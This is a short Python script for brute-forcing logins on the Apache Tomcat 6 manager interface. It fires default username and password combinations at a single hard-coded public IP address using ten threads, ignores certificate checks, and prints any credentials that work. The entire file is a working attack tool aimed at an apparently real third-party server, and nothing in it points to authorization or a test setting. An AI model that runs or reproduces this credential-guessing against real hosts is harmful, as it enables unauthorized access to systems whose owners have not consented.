# tomcat_bruteforce.py
import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures

def probar_credenciales(combinacion):
    usuario, contraseña = combinacion
    try:
        url = f"https://189.254.143.102/manager/html"
        respuesta = requests.get(url, auth=HTTPBasicAuth(usuario, contraseña), verify=False, timeout=5)
        
        if respuesta.status_code == 200 and 'Tomcat' in respuesta.text:
            return f"VÁLIDO: {usuario}:{contraseña}"
    except:
        pass
    return None

# Lista específica para Tomcat 6
usuarios = ['admin', 'tomcat', 'manager', 'root', 'tomcat6']
contraseñas = [
    'tomcat', 'admin', 'manager', 'password', '123456', 
    'tomcat6', 'Tomcat6', 'admin123', '', 'P@ssw0rd'
]

combinaciones = [(u, p) for u in usuarios for p in contraseñas]

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    resultados = executor.map(probar_credenciales, combinaciones)
    
    for resultado in resultados:
        if resultado:
            print(f"[+] {resultado}")